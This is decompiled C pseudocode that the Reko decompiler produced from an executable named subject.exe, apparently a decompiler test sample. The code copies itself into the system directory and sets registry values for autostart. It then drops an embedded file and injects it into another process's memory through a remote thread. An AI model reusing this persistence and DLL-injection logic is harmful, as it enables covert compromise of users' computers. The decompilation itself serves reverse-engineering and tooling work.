// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 fn00401000(Register ui32 ecx, Stack Eq_4 dwArg04, Stack (ptr32 word32) dwArg08)
Eq_2 fn00401000(ui32 ecx, LPCSTR dwArg04, word32 * dwArg08)
{
	Eq_4 edi_16 = dwArg04;
	word32 * esi_18 = dwArg08;
	Eq_2 eax_21 = LoadLibraryA(dwArg04);
	if (eax_21 != 0x00)
	{
		while (true)
		{
			ecx = ecx | ~0x00;
			while (ecx != 0x00)
			{
				edi_16 = (Eq_4) (edi_16 + 0x01);
				ecx = ecx - 0x01;
				if (0x00 != *edi_16)
					break;
			}
			if (*edi_16 == 0x00)
				break;
			eax_21 = GetProcAddress(eax_21, edi_16);
			*esi_18 = (word32) eax_21;
			if (eax_21 == 0x00)
				return eax_21;
			esi_18 = esi_18 + 0x01;
		}
		eax_21 = 0x01;
	}
	return eax_21;
}

// 00401041: Register Eq_46 fn00401041(Stack Eq_4 dwArg04, Stack Eq_48 dwArg08, Stack Eq_49 dwArg0C)
HANDLE fn00401041(LPCSTR dwArg04, LPCVOID dwArg08, Eq_49 dwArg0C)
{
	Eq_50 eax_24 = CreateFileA(dwArg04, 0x40000000, 0x03, null, 0x02, 0x00, null);
	if (eax_24 == (void *) 0x01)
		return eax_24 + 0x01;
	WriteFile(eax_24, dwArg08, dwArg0C, fp - 0x0C, null);
	CloseHandle(eax_24);
	return (void *) 0x01;
}

// 0040108D: void fn0040108D(Register ui32 ecx, Stack Eq_49 dwArg04, Stack Eq_4 dwArg08)
void fn0040108D(ui32 ecx, Eq_49 dwArg04, LPCSTR dwArg08)
{
	if (fn00401000(ecx, &globals->t405E74, &globals->ptr405EC8) == 0x00)
	{
		if (LoadLibraryA(&globals->t405EDC) == 0x00)
			return;
		while (true)
			Sleep(10000);
	}
	else
	{
		Eq_50 eax_52 = OpenProcess(0x043A, 0x00, dwArg04);
		if (eax_52 != null)
		{
			int32 eax_86 = lstrlenA(dwArg08);
			word32 ebp_102;
			byte SCZO_103;
			word32 ebx_104;
			word32 eax_105;
			byte SZO_106;
			bool C_107;
			bool Z_108;
			word32 edx_109;
			word32 ecx_110;
			ptr32 esp_101;
			globals->ptr405EC8();
			if (eax_105 != 0x00)
			{
				*(esp_101 - 0x04) = 0x00;
				*(esp_101 - 0x08) = eax_86;
				*(esp_101 - 0x0C) = (LPCSTR *) dwArg08;
				*(esp_101 - 0x10) = eax_105;
				*(esp_101 - 0x14) = (HANDLE *) eax_52;
				word32 ebp_148;
				byte SCZO_149;
				word32 ebx_150;
				word32 eax_151;
				byte SZO_152;
				bool C_153;
				bool Z_154;
				word32 edx_155;
				word32 ecx_156;
				ptr32 esp_147;
				globals->ptr405ED4();
				if (eax_151 != 0x00)
				{
					*(esp_147 - 0x04) = 4218484;
					Eq_2 eax_185 = GetModuleHandleA(*(esp_147 - 0x04));
					*(esp_147 - 0x04) = 4218471;
					*(esp_147 - 0x08) = (union Eq_2 *) eax_185;
					Eq_2 eax_191 = GetProcAddress(*(esp_147 - 0x08), *(esp_147 - 0x04));
					*(esp_147 - 0x04) = fp - 0x14;
					*(esp_147 - 0x08) = 0x00;
					*(esp_147 - 0x0C) = eax_105;
					*(esp_147 - 0x10) = (union Eq_2 *) eax_191;
					*(esp_147 - 0x14) = 0x00;
					*(esp_147 - 0x18) = 0x00;
					*(esp_147 - 0x1C) = (HANDLE *) eax_52;
					word32 ebp_211;
					byte SCZO_212;
					word32 ebx_213;
					word32 eax_214;
					byte SZO_215;
					bool C_216;
					bool Z_217;
					word32 edx_218;
					word32 ecx_219;
					globals->ptr405ED0();
					if (eax_214 != 0x00)
					{
						*(esp_147 - 0x04) = ~0x00;
						*(esp_147 - 0x08) = eax_214;
						WaitForSingleObject(*(esp_147 - 0x08), *(esp_147 - 0x04));
						*(esp_147 - 0x04) = fp - 0x1C;
						*(esp_147 - 0x08) = eax_214;
						GetExitCodeThread(*(esp_147 - 0x08), *(esp_147 - 0x04));
						*(esp_147 - 0x04) = eax_214;
						CloseHandle(*(esp_147 - 0x04));
					}
				}
				word32 * esp_163 = esp_147 - 0x04;
				*esp_163 = 0x8000;
				*(esp_163 - 0x04) = 0x00;
				*(esp_163 - 0x08) = eax_105;
				*(esp_163 - 0x0C) = (HANDLE *) eax_52;
				word32 ebp_174;
				byte SCZO_175;
				word32 ebx_176;
				word32 eax_177;
				byte SZO_178;
				bool C_179;
				bool Z_180;
				word32 edx_181;
				word32 ecx_182;
				globals->ptr405ECC();
			}
			HANDLE * esp_128 = esp_101 - 0x04;
			*esp_128 = (HANDLE *) eax_52;
			CloseHandle(*esp_128);
		}
	}
}

// 00401198: void fn00401198(Stack Eq_377 dwArg04)
void fn00401198(HKEY dwArg04)
{
	RegCreateKeyA(dwArg04, &globals->t405E2B, fp - 0x08);
	RegSetValueExA(dwLoc08, &globals->t403000, 0x00, 0x01, &globals->t405FE1, lstrlenA(&globals->t405FE1) + 0x01);
	RegCloseKey(dwLoc08);
}

// 004011DD: Register Eq_49 Win32CrtStartup()
Eq_49 Win32CrtStartup()
{
	GetSystemDirectoryA(&globals->t405FE1, 0x0104);
	lstrcatA(&globals->t405FE1, &globals->t40300D);
	GetModuleFileNameA(0x00, &globals->t4060E6, 0x0104);
	fn00401198((struct HKEY__ *) 0x80000001);
	fn00401198((struct HKEY__ *) 0x80000002);
	if (lstrcmpiA(&globals->t4060E6, &globals->t405FE1) == 0x00)
	{
		GetSystemDirectoryA(&globals->t405EDC, 0x0104);
		lstrcatA(&globals->t405EDC, &globals->t40301C);
		SetFileAttributesA(&globals->t405EDC, 0x80);
		if (fn00401041(&globals->t405EDC, &globals->v403026, 0x2E00) != 0x00)
		{
			GetWindowThreadProcessId(FindWindowA(&globals->t405E59, null), &globals->t405ED8);
			fn0040108D(ecx, globals->t405ED8, &globals->t405EDC);
		}
		ExitProcess(0x00);
	}
	else
	{
		SetFileAttributesA(&globals->t405FE1, 0x80);
		if (CopyFileA(&globals->t4060E6, &globals->t405FE1, 0x00) != 0x00)
		{
			SetFileAttributesA(&globals->t405FE1, 0x80);
			ShellExecuteA(null, &globals->t405E26, &globals->t405FE1, null, null, 0x00);
		}
		ExitProcess(0x00);
	}
}

